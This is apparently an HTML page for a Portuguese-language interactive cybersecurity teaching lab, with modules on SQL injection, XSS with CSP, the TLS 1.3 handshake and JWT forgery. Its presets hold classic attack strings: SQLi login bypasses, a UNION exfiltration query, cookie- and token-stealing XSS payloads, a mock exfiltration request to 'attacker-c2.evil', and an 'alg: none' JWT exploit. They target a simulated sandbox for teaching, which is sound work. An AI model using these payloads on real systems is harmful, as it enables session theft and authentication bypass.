@@ -1,0 +1,974 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CyberSec Lab | Laboratório Visual de Segurança da Informação &amp; Criptografia</title>
+  <meta name="description" content="Laboratório interativo de cibersegurança executado 100% no navegador via Web Crypto API nativa. Simulações reais de SQL Injection com parser AST, XSS com defesa CSP, TLS 1.3 Handshake em raias, JWT Inspector tricolor e resistência de hashes criptográficos.">
+  <meta name="author" content="Sandro Junior Hoffmann de Oliveira (@sanjrhoff)">
+
+  <!-- Fontes Tipográficas: Inter & JetBrains Mono -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <!-- Font Awesome Icons 6.4.0 -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <!-- Stylesheet SOC Industrial Dark Zinc -->
+  <link rel="stylesheet" href="style.css?v=2">
+</head>
+<body>
+
+  <!-- ==========================================================================
+       1. HEADER PRINCIPAL / COCKPIT DE TELEMETRIA FORENSE
+       ========================================================================== -->
+  <header class="cyber-header" role="banner">
+    <div class="header-left">
+      <a href="../index.html" class="back-link" title="Voltar ao Portfólio Principal" aria-label="Voltar ao Portfólio">
+        <i class="fas fa-arrow-left"></i>
+      </a>
+      <div class="brand-wrap">
+        <div class="brand-icon-wrap" aria-hidden="true">
+          <i class="fas fa-shield-halved"></i>
+          <span class="brand-dot-pulse" title="SIEM HUD Ativo"></span>
+        </div>
+        <div class="brand-headings">
+          <div class="brand-title">
+            CYBERSEC LAB
+            <span class="brand-badge">OWASP TOP 10</span>
+            <span class="brand-badge" style="background: rgba(16, 185, 129, 0.1); color: var(--sec-emerald-bright); border-color: var(--sec-emerald-border);">WEB CRYPTO API</span>
+          </div>
+          <span class="brand-subtitle">Laboratório Visual de Segurança da Informação &amp; Criptografia Interativa</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Telemetria Central do SOC -->
+    <div class="header-telemetry" aria-label="Métricas de Segurança do Laboratório">
+      <div class="telemetry-item telemetry-item--exploit" title="Exploits e ataques simulados executados com sucesso">
+        <i class="fas fa-bug text-crimson"></i>
+        <span>EXPLOITS:</span>
+        <strong id="stat-exploits">0</strong>
+      </div>
+      <span class="telemetry-divider">/</span>
+      <div class="telemetry-item telemetry-item--blocked" title="Tentativas de ataque bloqueadas com sucesso pelas defesas ativas">
+        <i class="fas fa-shield-check text-emerald"></i>
+        <span>BLOCKED:</span>
+        <strong id="stat-blocked">0</strong>
+      </div>
+      <span class="telemetry-divider">/</span>
+      <div class="telemetry-item telemetry-item--crypto" title="Operações criptográficas reais executadas nativamente via crypto.subtle">
+        <i class="fas fa-key text-cyan"></i>
+        <span>CRYPTO OPS:</span>
+        <strong id="stat-crypto">0</strong>
+      </div>
+    </div>
+
+    <!-- Ações Globais da Bancada -->
+    <div class="header-actions">
+      <button type="button" class="btn-header" id="btn-global-reset" title="Restaurar parâmetros padrão do módulo ativo (Alt + R)">
+        <i class="fas fa-rotate-left"></i>
+        <span>Reset</span>
+        <span class="kbd">Alt+R</span>
+      </button>
+      <button type="button" class="btn-header" id="btn-global-export" title="Visualizar e exportar relatório de auditoria forense (Alt + E)">
+        <i class="fas fa-file-shield"></i>
+        <span>Relatório</span>
+        <span class="kbd">Alt+E</span>
+      </button>
+      <a href="../index.html#laboratorio" class="btn-header" title="Retornar ao catálogo de aplicações do portfólio">
+        <i class="fas fa-door-open"></i>
+        <span>Sair</span>
+      </a>
+    </div>
+  </header>
+
+  <!-- ==========================================================================
+       2. NAVEGAÇÃO POR ABAS (MÓDULOS FORENSES 1 A 5)
+       ========================================================================== -->
+  <nav class="cyber-tabs-nav" role="tablist" aria-label="Navegação dos Módulos de Segurança">
+    <button type="button" class="cyber-tab-btn is-active" data-tab="sqli" id="tab-btn-sqli" role="tab" aria-selected="true" aria-controls="panel-sqli">
+      <span class="tab-num">1</span>
+      <span>SQLi &amp; AST Parser</span>
+    </button>
+    <button type="button" class="cyber-tab-btn" data-tab="xss" id="tab-btn-xss" role="tab" aria-selected="false" aria-controls="panel-xss">
+      <span class="tab-num">2</span>
+      <span>XSS &amp; CSP Defense</span>
+    </button>
+    <button type="button" class="cyber-tab-btn" data-tab="tls" id="tab-btn-tls" role="tab" aria-selected="false" aria-controls="panel-tls">
+      <span class="tab-num">3</span>
+      <span>TLS 1.3 Handshake</span>
+    </button>
+    <button type="button" class="cyber-tab-btn" data-tab="jwt" id="tab-btn-jwt" role="tab" aria-selected="false" aria-controls="panel-jwt">
+      <span class="tab-num">4</span>
+      <span>JWT Inspector</span>
+    </button>
+    <button type="button" class="cyber-tab-btn" data-tab="hash" id="tab-btn-hash" role="tab" aria-selected="false" aria-controls="panel-hash">
+      <span class="tab-num">5</span>
+      <span>Hash &amp; Salt Lab</span>
+    </button>
+  </nav>
+
+  <!-- ==========================================================================
+       3. VIEWPORT MODULAR DINÂMICO
+       ========================================================================== -->
+  <main class="cyber-workbench-viewport" id="workbench-viewport">
+
+    <!-- ======================================================================
+         MÓDULO 1: SQL Injection (SQLi) & AST Parser
+         ====================================================================== -->
+    <section class="module-panel is-active" id="panel-sqli" role="tabpanel" aria-labelledby="tab-btn-sqli">
+      <div class="module-header">
+        <div class="module-info">
+          <div class="module-tag-row">
+            <span class="owasp-tag"><i class="fas fa-triangle-exclamation"></i> OWASP A03:2021 — INJECTION</span>
+            <span class="crypto-tag"><i class="fas fa-sitemap"></i> AST GRAMMAR PARSER</span>
+          </div>
+          <h2 class="module-title">SQL Injection Playground &amp; Abstract Syntax Tree (AST)</h2>
+          <p class="module-desc">
+            Compreenda a subversão da gramática SQL através da visualização em tempo real da Árvore Sintática Abstrata (AST). Observe como operadores de escape alteram a árvore lógica forçando tautologias, e compare lado a lado com a blindagem por Prepared Statements.
+          </p>
+        </div>
+      </div>
+
+      <div class="split-grid-2">
+        <!-- Coluna Esquerda: Entrada e Consulta -->
+        <div class="card-panel">
+          <div class="card-panel-header">
+            <span class="card-title"><i class="fas fa-terminal text-cyan"></i> Formulário de Autenticação / Injetor</span>
+            <span class="badge-cyan font-mono">CLIENT-SIDE MOCK</span>
+          </div>
+          <div class="card-panel-body">
+            <!-- Seletor de Modo -->
+            <label class="form-label">Modo de Arquitetura de Acesso a Dados:</label>
+            <div class="sqli-mode-selector">
+              <button type="button" class="sqli-mode-btn active-vuln" id="btn-sqli-vuln" title="Interpolação direta de strings vulnerável">
+                <i class="fas fa-triangle-exclamation text-crimson"></i>
+                <span>Modo Vulnerável (String Concat)</span>
+              </button>
+              <button type="button" class="sqli-mode-btn" id="btn-sqli-secure" title="Parametrização estrita com Prepared Statements">
+                <i class="fas fa-shield-halved text-emerald"></i>
+                <span>Modo Seguro (Prepared Statement)</span>
+              </button>
+            </div>
+
+            <!-- Presets de Ataque -->
+            <label class="form-label">Presets de Payloads SQLi:</label>
+            <div class="presets-container" id="sqli-presets">
+              <button type="button" class="preset-chip active" data-payload="' OR '1'='1' --" data-user="' OR '1'='1' --" data-pass="qualquer">
+                <i class="fas fa-crosshairs"></i> Bypass Clássico (' OR '1'='1' --)
+              </button>
+              <button type="button" class="preset-chip" data-payload="admin' --" data-user="admin' --" data-pass="qualquer">
+                <i class="fas fa-user-secret"></i> Bypass Admin (admin' --)
+              </button>
+              <button type="button" class="preset-chip" data-payload="1' OR 1=1 #" data-user="1' OR 1=1 #" data-pass="qualquer">
+                <i class="fas fa-bolt"></i> Tautologia Numérica (1' OR 1=1 #)
+              </button>
+              <button type="button" class="preset-chip" data-payload="' UNION SELECT 99, 'exfil_c2', 'hash_99', 'admin', 'c2@dark.net', 99999 --" data-user="' UNION SELECT 99, 'exfil_c2', 'hash_99', 'admin', 'c2@dark.net', 99999 --" data-pass="qualquer">
+                <i class="fas fa-database"></i> Union Exfiltration
+              </button>
+              <button type="button" class="preset-chip" data-payload="admin" data-user="admin" data-pass="admin2026">
+                <i class="fas fa-check"></i> Credencial Legítima
+              </button>
+            </div>
+
+            <!-- Campos de Entrada -->
+            <form id="sqli-form" onsubmit="return false;">
+              <div class="form-group">
+                <label for="sqli-username" class="form-label">Parâmetro de Entrada (Usuário / Injeção):</label>
+                <input type="text" id="sqli-username" class="form-input" value="' OR '1'='1' --" spellcheck="false" autocomplete="off">
+              </div>
+              <div class="form-group">
+                <label for="sqli-password" class="form-label">Senha:</label>
+                <input type="password" id="sqli-password" class="form-input" value="qualquer" spellcheck="false" autocomplete="off">
+              </div>
+
+              <div class="btn-action-row">
+                <button type="button" class="btn-sec btn-sec--danger" id="btn-sqli-execute">
+                  <i class="fas fa-play"></i> Executar Query
+                </button>
+                <button type="button" class="btn-sec btn-sec--outline" id="btn-sqli-clear">
+                  <i class="fas fa-eraser"></i> Limpar
+                </button>
+              </div>
+            </form>
+
+            <!-- Query Visualizada -->
+            <div class="query-box-wrap">
+              <div class="query-box-title">
+                <span>Consulta SQL Resultante no Driver:</span>
+                <span id="sqli-query-type" class="text-crimson font-mono">[UNSANITIZED INTERPOLATION]</span>
+              </div>
+              <div class="query-code-display" id="sqli-query-display"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Coluna Direita: AST Visual e Banco de Dados Mock -->
+        <div class="card-panel">
+          <div class="card-panel-header">
+            <span class="card-title"><i class="fas fa-sitemap text-violet"></i> Árvore Sintática Abstrata (AST Visual)</span>
+            <span id="ast-status-badge" class="badge-danger font-mono">SUBVERSÃO DETECTADA</span>
+          </div>
+          <div class="card-panel-body">
+            <!-- Viewport da Árvore -->
+            <div class="ast-viewport" id="ast-viewport">
+              <!-- Renderizado dinamicamente via JS -->
+            </div>
+
+            <!-- Tabela Mock DB -->
+            <div class="db-table-wrap">
+              <div class="db-status-banner db-status--breached" id="db-status-banner">
+                <span id="db-status-text"><i class="fas fa-radiation"></i> AUTENTICAÇÃO VIOLADA: 5 REGISTROS RETORNADOS!</span>
+                <span class="font-mono" id="db-rows-count">ROWS: 5</span>
+              </div>
+              <table class="db-table" id="sqli-db-table">
+                <thead>
+                  <tr>
+                    <th>ID</th>
+                    <th>Username</th>
+                    <th>Role</th>
+                    <th>Email</th>
+                    <th>Salary</th>
+                    <th>Password Hash</th>
+                  </tr>
+                </thead>
+                <tbody id="sqli-db-tbody">
+                  <!-- Injetado dinamicamente via JS -->
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ======================================================================
+         MÓDULO 2: XSS Lab & Defesa com CSP
+         ====================================================================== -->
+    <section class="module-panel" id="panel-xss" role="tabpanel" aria-labelledby="tab-btn-xss">
+      <div class="module-header">
+        <div class="module-info">
+          <div class="module-tag-row">
+            <span class="owasp-tag"><i class="fas fa-triangle-exclamation"></i> OWASP A03:2021 — XSS</span>
+            <span class="rfc-tag"><i class="fas fa-shield-halved"></i> CONTENT SECURITY POLICY (CSP)</span>
+          </div>
+          <h2 class="module-title">Cross-Site Scripting (XSS) &amp; Defesa em Profundidade com CSP</h2>
+          <p class="module-desc">
+            Simule o roubo de sessões por injeção de scripts no contexto do navegador da vítima. Compare lado a lado os efeitos da falta de sanitização, a eficácia do contextual output encoding e o bloqueio estrito via cabeçalho HTTP Content-Security-Policy.
+          </p>
+        </div>
+      </div>
+
+      <div class="split-grid-2">
+        <!-- Coluna Esquerda: Injetor e Políticas -->
+        <div class="card-panel">
+          <div class="card-panel-header">
+            <span class="card-title"><i class="fas fa-syringe text-amber"></i> Injetor de Payloads XSS</span>
+            <span class="badge-warn font-mono">ISOLATED SANDBOX</span>
+          </div>
+          <div class="card-panel-body">
+            <!-- Tipos de XSS -->
+            <label class="form-label">Vetor de Ataque Simulado:</label>
+            <div class="xss-attack-types" id="xss-attack-types">
+              <button type="button" class="xss-type-btn is-active" data-type="reflected">Reflected XSS (Busca)</button>
+              <button type="button" class="xss-type-btn" data-type="stored">Stored XSS (Mural)</button>
+              <button type="button" class="xss-type-btn" data-type="dom">DOM-based XSS (Hash)</button>
+            </div>
+
+            <!-- Presets de Payload -->
+            <label class="form-label">Presets de Payloads Maliciosos:</label>
+            <div class="presets-container" id="xss-presets">
+              <button type="button" class="preset-chip active" data-payload="<script>stealSession(document.cookie)</script>">
+                <i class="fas fa-cookie-bite"></i> Cookie Stealer (&lt;script&gt;)
+              </button>
+              <button type="button" class="preset-chip" data-payload="<img src=x onerror=&quot;stealSession(localStorage.getItem('jwt_token'))&quot;>">
+                <i class="fas fa-image"></i> Token Stealer (&lt;img onerror&gt;)
+              </button>
+              <button type="button" class="preset-chip" data-payload="<svg onload=&quot;alert('XSS: DOM Hijacked!')&quot;>">
+                <i class="fas fa-vector-square"></i> SVG Onload Alert
+              </button>
+              <button type="button" class="preset-chip" data-payload="<a href=&quot;javascript:stealSession('click_hijack')&quot;>Clique aqui para resgatar bônus corporativo!</a>">
+                <i class="fas fa-link"></i> Link Malicioso (javascript:)
+              </button>
+            </div>
+
+            <!-- Campo de Texto -->
+            <div class="form-group">
+              <label for="xss-input" class="form-label" id="xss-input-label">Entrada Não Confiável do Usuário (Search Query):</label>
+              <textarea id="xss-input" class="form-textarea" spellcheck="false">&lt;script&gt;stealSession(document.cookie)&lt;/script&gt;</textarea>
+            </div>
+
+            <!-- Defesas em Profundidade (Toggles) -->
+            <label class="form-label">Camadas Defensivas Ativas:</label>
+            <div class="toggle-switch-group">
+              <div class="toggle-switch-label">
+                <span class="toggle-switch-title">Sanitização de Saída (Contextual HTML Encoding)</span>
+                <span class="toggle-switch-desc">Converte caracteres perigosos (&lt;, &gt;, &quot;, &apos;, &amp;) em entidades HTML inofensivas.</span>
+              </div>
+              <button type="button" class="toggle-btn" id="toggle-xss-sanitize" aria-label="Ativar Sanitização"></button>
+            </div>
+
+            <div class="toggle-switch-group">
+              <div class="toggle-switch-label">
+                <span class="toggle-switch-title">Content Security Policy (Cabeçalho HTTP CSP)</span>
+                <span class="toggle-switch-desc"><code>default-src 'self'; script-src 'self'; object-src 'none'</code></span>
+              </div>
+              <button type="button" class="toggle-btn" id="toggle-xss-csp" aria-label="Ativar CSP"></button>
+            </div>
+
+            <div class="btn-action-row">
+              <button type="button" class="btn-sec btn-sec--danger" id="btn-xss-execute">
+                <i class="fas fa-paper-plane"></i> Submeter / Injetar
+              </button>
+              <button type="button" class="btn-sec btn-sec--outline" id="btn-xss-reset">
+                <i class="fas fa-rotate-left"></i> Limpar Mural
+              </button>
+            </div>
+
+            <!-- Comparador de Encoding -->
+            <div class="encoding-diff-box">
+              <div class="encoding-diff-row">
+                <span class="encoding-diff-label">Payload Bruto (Raw Input):</span>
+                <div class="encoding-diff-code" id="xss-raw-preview"></div>
+              </div>
+              <div class="encoding-diff-row">
+                <span class="encoding-diff-label">Código Renderizado no DOM (Encoded Output):</span>
+                <div class="encoding-diff-code font-mono text-emerald" id="xss-encoded-preview"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Coluna Direita: Sandbox do Navegador da Vítima -->
+        <div class="card-panel">
+          <div class="card-panel-header">
+            <span class="card-title"><i class="fas fa-desktop text-cyan"></i> Sandbox da Sessão da Vítima (Target Browser)</span>
+            <span class="badge-cyan font-mono" id="xss-session-state">HTTPOnly: FALSE</span>
+          </div>
+          <div class="card-panel-body">
+            <!-- Portal Feed -->
+            <div class="victim-sandbox-box">
+              <div class="victim-portal-header">
+                <div class="victim-portal-title">
+                  <i class="fas fa-globe"></i> Intranet Corporativa — Mural de Colaboradores
+                </div>
+                <span>Usuário Ativo: Mariana Silva (Diretora Financeira)</span>
+              </div>
+              <div class="intranet-feed" id="intranet-feed">
+                <!-- Comentários renderizados dinamicamente -->
+              </div>
+            </div>
+
+            <!-- Armazenamento da Vítima -->
+            <div class="victim-storage-card">
+              <div style="font-weight: 700; color: var(--text-pure); margin-bottom: 0.5rem; text-transform: uppercase;">
+                <i class="fas fa-database text-violet"></i> Estado de Armazenamento Local da Vítima
+              </div>
+              <div class="storage-item">
+                <span class="storage-key">document.cookie:</span>
+                <span class="storage-val text-crimson" id="victim-cookie">session_auth=SANDRO_SEC_AUTH_9981aef; role=finance</span>
+              </div>
+              <div class="storage-item">
+                <span class="storage-key">localStorage.jwt:</span>
+                <span class="storage-val text-violet" id="victim-jwt">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJy...</span>
+              </div>
+            </div>
+
+            <!-- Toast de Exfiltração C2 -->
+            <div class="exfil-c2-toast" id="exfil-c2-toast">
+              <div class="exfil-c2-title">
+                <i class="fas fa-triangle-exclamation"></i>
+                ALERTA C2: DADOS EXFILTRADOS COM SUCESSO PARA SERVIDOR DO ATACANTE!
+              </div>
+              <div class="exfil-c2-body" id="exfil-c2-body">
+                GET https://attacker-c2.evil/drop?stolen_data=...
+              </div>
+            </div>
+
+            <!-- Console CSP Violations -->
+            <div class="csp-console-box" id="csp-console-box">
+              <div class="csp-console-title">
+                <i class="fas fa-shield-alt"></i> CSP Reporting API Console (Violações de Política):
+              </div>
+              <div id="csp-violations-list" class="text-secondary">
+                Nenhuma violação de CSP registrada no momento.
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ======================================================================
+         MÓDULO 3: TLS 1.3 / HTTPS Handshake & Diffie-Hellman
+         ====================================================================== -->
+    <section class="module-panel" id="panel-tls" role="tabpanel" aria-labelledby="tab-btn-tls">
+      <div class="module-header">
+        <div class="module-info">
+          <div class="module-tag-row">
+            <span class="crypto-tag"><i class="fas fa-lock"></i> RFC 8446 — TLS 1.3 SPECIFICATION</span>
+            <span class="rfc-tag"><i class="fas fa-arrows-split-up-and-left"></i> ECDHE FORWARD SECRECY</span>
+          </div>
+          <h2 class="module-title">TLS 1.3 Handshake Simulator &amp; Troca de Chaves Diffie-Hellman</h2>
+          <p class="module-desc">
+            Acompanhe visualmente a sequência de pacotes entre Cliente, Sniffer de Rede e Servidor HTTPS. Entenda a matemática do Diffie-Hellman Efêmero ($g^{ab} \pmod p$) que impede bisbilhoteiros de decifrarem mensagens mesmo interceptando todos os pacotes públicos.
+          </p>
+        </div>
+      </div>
+
+      <!-- Barra de Controles do Handshake -->
+      <div class="tls-controls-bar">
+        <div class="tls-btn-group">
+          <button type="button" class="btn-sec btn-sec--primary" id="btn-tls-play">
+            <i class="fas fa-play"></i> Iniciar Handshake TLS 1.3
+          </button>
+          <button type="button" class="btn-sec btn-sec--outline" id="btn-tls-step">
+            <i class="fas fa-forward-step"></i> Avançar Passo
+          </button>
+          <button type="button" class="btn-sec btn-sec--outline" id="btn-tls-reset">
+            <i class="fas fa-rotate-left"></i> Reiniciar
+          </button>
+        </div>
+        <div class="tls-speed-selector">
+          <span>Velocidade:</span>
+          <button type="button" class="tls-speed-btn" data-speed="0.5">0.5x</button>
+          <button type="button" class="tls-speed-btn is-active" data-speed="1">1x</button>
+          <button type="button" class="tls-speed-btn" data-speed="2">2x</button>
+        </div>
+        <div class="font-mono text-cyan" id="tls-status-pill">
+          <i class="fas fa-unlock text-crimson"></i> STATUS: CANAL DESPROTEGIDO (TEXTO PLANO)
+        </div>
+      </div>
+
+      <!-- Raias de Sequência e Timeline -->
+      <div class="tls-lanes-container">
+        <div class="tls-lanes-header">
+          <div class="tls-lane-node">
+            <div class="tls-node-icon"><i class="fas fa-laptop-code"></i></div>
+            <span class="tls-node-label">Navegador Cliente</span>
+            <span class="tls-node-sub font-mono">192.168.1.45 (TLS 1.3 Client)</span>
+          </div>
+          <div class="tls-lane-node">
+            <div class="tls-node-icon sniffer-node"><i class="fas fa-wifi"></i></div>
+            <span class="tls-node-label">Rede Wi-Fi Insegura (Sniffer)</span>
+            <span class="tls-node-sub font-mono">Atacante Passivo (Promiscuous Mode)</span>
+          </div>
+          <div class="tls-lane-node">
+            <div class="tls-node-icon server-node"><i class="fas fa-server"></i></div>
+            <span class="tls-node-label">Servidor Web HTTPS</span>
+            <span class="tls-node-sub font-mono">CN=soc.corp.internal (Cert X.509)</span>
+          </div>
+        </div>
+
+        <!-- Passos do Handshake -->
+        <div class="tls-steps-flow" id="tls-steps-flow">
+          <!-- Passo 1: ClientHello -->
+          <div class="tls-step-card" id="tls-step-1">
+            <div class="tls-step-top">
+              <span class="tls-step-badge">FASE 1: CLIENT HELLO</span>
+              <span class="font-mono text-cyan">Cliente ➔ Servidor</span>
+            </div>
+            <div class="tls-step-title">Envio de Cifras Suportadas &amp; Chave Pública Efêmera A</div>
+            <div class="tls-step-desc">
+              O cliente envia o <code>Client Random</code> (32 bytes de entropia CSPRNG), lista de Cipher Suites (<code>TLS_AES_256_GCM_SHA384</code>) e sua chave pública efêmera de Diffie-Hellman $A = g^a \pmod p$.
+            </div>
+            <div class="tls-step-payload-data" id="tls-payload-step-1">
+              ClientRandom: 0x9f4a... | CipherSuites: [TLS_AES_256_GCM_SHA384, TLS_CHACHA20] | DH KeyShare A: 0x8a1b...
+            </div>
+          </div>
+
+          <!-- Passo 2: ServerHello -->
+          <div class="tls-step-card" id="tls-step-2">
+            <div class="tls-step-top">
+              <span class="tls-step-badge">FASE 2: SERVER HELLO &amp; CERTIFICADO</span>
+              <span class="font-mono text-emerald">Servidor ➔ Cliente</span>
+            </div>
+            <div class="tls-step-title">Seleção de Cifra, Chave Efêmera B &amp; Certificado X.509</div>
+            <div class="tls-step-desc">
+              O servidor seleciona a suíte criptográfica, envia <code>Server Random</code>, sua chave pública efêmera $B = g^b \pmod p$ e a cadeia de certificados digitais X.509 assinada por CA de confiança.
+            </div>
+            <div class="tls-step-payload-data" id="tls-payload-step-2">
+              ServerRandom: 0x3e12... | SelectedCipher: TLS_AES_256_GCM_SHA384 | DH KeyShare B: 0x5c42... | X509: CN=soc.corp
+            </div>
+          </div>
+
+          <!-- Passo 3: Troca DH -->
+          <div class="tls-step-card" id="tls-step-3">
+            <div class="tls-step-top">
+              <span class="tls-step-badge">FASE 3: CÁLCULO DIFFIE-HELLMAN (ECDHE)</span>
+              <span class="font-mono text-violet">Cálculo Local Independente</span>
+            </div>
+            <div class="tls-step-title">Geração Matemática do Segredo Pré-Mestre Compartilhado K</div>
+            <div class="tls-step-desc">
+              Sem transmitir segredos pela rede, ambos calculam o mesmo $K = B^a \pmod p = A^b \pmod p = g^{ab} \pmod p$. O bisbilhoteiro só interceptou $A$ e $B$, sendo incapaz de computar $K$.
+            </div>
+          </div>
+
+          <!-- Passo 4: Derivação de Chaves HKDF -->
+          <div class="tls-step-card" id="tls-step-4">
+            <div class="tls-step-top">
+              <span class="tls-step-badge">FASE 4: DERIVAÇÃO HKDF-EXPAND</span>
+              <span class="font-mono text-cyan">Geração de Chaves de Sessão</span>
+            </div>
+            <div class="tls-step-title">Derivação da Chave Simétrica de Aplicação AES-256-GCM</div>
+            <div class="tls-step-desc">
+              A partir do segredo $K$ e das entropias aleatórias, deriva-se a chave simétrica de sessão de 256 bits para tráfego seguro de ultra-alta velocidade.
+            </div>
+          </div>
+
+          <!-- Passo 5: Canal Cifrado Finished -->
+          <div class="tls-step-card" id="tls-step-5">
+            <div class="tls-step-top">
+              <span class="tls-step-badge">FASE 5: HANDSHAKE CONCLUÍDO</span>
+              <span class="font-mono text-emerald">🔒 CANAL HTTPS CIFRADO ATIVO</span>
+            </div>
+            <div class="tls-step-title">Cadeado Verde Acionado: Confidencialidade e Integridade Garantidas</div>
+            <div class="tls-step-desc">
+              A partir deste instante, 100% dos dados da camada de aplicação (cabeçalhos, URLs, cookies de autenticação e corpos de requisições POST) viajam encapsulados em ciphertext criptografado.
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Caixa Matemática DH e Packet Sniffer Lado a Lado -->
+      <div class="split-grid-2">
+        <!-- Diffie-Hellman Math Card -->
+        <div class="card-panel">
+          <div class="card-panel-header">
+            <span class="card-title"><i class="fas fa-calculator text-cyan"></i> Matemática do Diffie-Hellman</span>
+            <span class="badge-cyan font-mono">DISCRETE LOG PROBLEM</span>
+          </div>
+          <div class="card-panel-body">
+            <div class="dh-math-title"><i class="fas fa-function"></i> Teoria dos Números &amp; Exponenciação Modular:</div>
+            <div class="dh-formula-wrap">
+              Parâmetros Públicos: Base $g = 5$, Módulo Primo $p = 23$<br>
+              Cliente gera segredo privado $a = 6 \implies A = 5^6 \pmod{23} = 8$<br>
+              Servidor gera segredo privado $b = 15 \implies B = 5^{15} \pmod{23} = 19$<br>
+              Ambos derivam o mesmo segredo $K$:<br>
+              <strong>Cliente: $K = 19^6 \pmod{23} = 2$ | Servidor: $K = 8^{15} \pmod{23} = 2$</strong>
+            </div>
+            <div class="dh-math-grid">
+              <div class="dh-param-card">
+                <span class="dh-param-label">Chave Pública A (Cliente):</span>
+                <span class="dh-param-val" id="dh-val-a">A = 8</span>
+              </div>
+              <div class="dh-param-card">
+                <span class="dh-param-label">Chave Pública B (Servidor):</span>
+                <span class="dh-param-val" id="dh-val-b">B = 19</span>
+              </div>
+              <div class="dh-param-card">
+                <span class="dh-param-label">Segredo Compartilhado K:</span>
+                <span class="dh-param-val text-emerald" id="dh-val-k">K = 2 (Seguro)</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Packet Sniffer (Wi-Fi Interceptor) -->
+        <div class="card-panel">
+          <div class="card-panel-header">
+            <span class="card-title"><i class="fas fa-radar text-amber"></i> Wi-Fi Packet Sniffer em Tempo Real</span>
+            <span class="badge-warn font-mono">PROMISCUOUS CAPTURE</span>
+          </div>
+          <div class="card-panel-body">
+            <div class="sniffer-mode-toggle">
+              <button type="button" class="sniffer-toggle-btn active-http" id="btn-sniff-http">
+                <i class="fas fa-lock-open text-crimson"></i> Conexão HTTP (Sem Criptografia)
+              </button>
+              <button type="button" class="sniffer-toggle-btn" id="btn-sniff-https">
+                <i class="fas fa-lock text-emerald"></i> Conexão HTTPS (TLS 1.3 Ativo)
+              </button>
+            </div>
+            <div class="sniffer-feed" id="sniffer-feed-view">
+              <!-- Logs do Sniffer injetados aqui -->
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ======================================================================
+         MÓDULO 4: JWT Inspector & Signature Forgery
+         ====================================================================== -->
+    <section class="module-panel" id="panel-jwt" role="tabpanel" aria-labelledby="tab-btn-jwt">
+      <div class="module-header">
+        <div class="module-info">
+          <div class="module-tag-row">
+            <span class="owasp-tag"><i class="fas fa-triangle-exclamation"></i> OWASP A01:2021 — BROKEN ACCESS CONTROL</span>
+            <span class="rfc-tag"><i class="fas fa-passport"></i> RFC 7519 JSON WEB TOKEN</span>
+            <span class="crypto-tag"><i class="fas fa-signature"></i> HMAC-SHA256 (WEB CRYPTO)</span>
+          </div>
+          <h2 class="module-title">JWT Inspector &amp; Signature Forgery Lab</h2>
+          <p class="module-desc">
+            Inspecione e manipule tokens JWT com assinatura criptográfica HMAC-SHA256 real calculada pela Web Crypto API. Observe a detecção imediata de violação de assinatura ao alterar privilégios e explore o clássico exploit <code>alg: none</code>.
+          </p>
+        </div>
+      </div>
+
+      <!-- Display Base64URL Tricolor -->
+      <div class="jwt-raw-display" id="jwt-raw-display">
+        <span class="jwt-part jwt-part--header" id="jwt-raw-header" title="Cabeçalho (Algoritmo e Tipo)">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>
+        <span class="jwt-dot">.</span>
+        <span class="jwt-part jwt-part--payload" id="jwt-raw-payload" title="Payload / Claims (Identidade e Permissões)">eyJyZXNvdXJjZSI6InVzZXJfYXV0aCIsInVzZXIiOiJzYW5kcm8iLCJyb2xlIjoidXNlciJ9</span>
+        <span class="jwt-dot">.</span>
+        <span class="jwt-part jwt-part--signature" id="jwt-raw-signature" title="Assinatura Criptográfica HMAC-SHA256">p1V6_Z...</span>
+      </div>
+
+      <div class="split-grid-3">
+        <!-- Coluna 1: Header JSON -->
+        <div class="card-panel">
+          <div class="card-panel-header">
+            <span class="card-title text-crimson"><i class="fas fa-file-code"></i> 1. Header (JSON)</span>
+            <span class="badge-danger font-mono">ROSA/CRIMSON</span>
+          </div>
+          <div class="card-panel-body">
+            <div class="form-group">
+              <label for="jwt-header-editor" class="form-label">Metadados do Algoritmo:</label>
+              <textarea id="jwt-header-editor" class="form-textarea" spellcheck="false" style="min-height: 140px; color: var(--sec-crimson-bright);"></textarea>
+            </div>
+            <button type="button" class="btn-sec btn-sec--danger" id="btn-jwt-alg-none" style="width: 100%;" title="Remove assinatura e altera cabeçalho para {alg: 'none'}">
+              <i class="fas fa-bomb"></i> Ativar Exploit 'alg: none'
+            </button>
+            <p style="font-size: 0.72rem; color: var(--text-muted); margin-top: 0.5rem;">
+              Simula o clássico bypass de verificação em backends com validação de algoritmo frouxa (CVE-2015-9235).
+            </p>
+          </div>
+        </div>
+
+        <!-- Coluna 2: Payload Claims JSON -->
+        <div class="card-panel">
+          <div class="card-panel-header">
+            <span class="card-title text-violet"><i class="fas fa-id-card"></i> 2. Payload / Claims (JSON)</span>
+            <span class="rfc-tag font-mono">VIOLETA</span>
+          </div>
+          <div class="card-panel-body">
+            <div class="form-group">
+              <label for="jwt-payload-editor" class="form-label">Dados de Identidade &amp; Role:</label>
+              <textarea id="jwt-payload-editor" class="form-textarea" spellcheck="false" style="min-height: 140px; color: var(--sec-violet-bright);"></textarea>
+            </div>
+            <div class="presets-container">
+              <button type="button" class="preset-chip" id="btn-jwt-escalate">
+                <i class="fas fa-user-shield"></i> Tornar 'admin'
+              </button>
+              <button type="button" class="preset-chip" id="btn-jwt-demote">
+                <i class="fas fa-user"></i> Restaurar 'user'
+              </button>
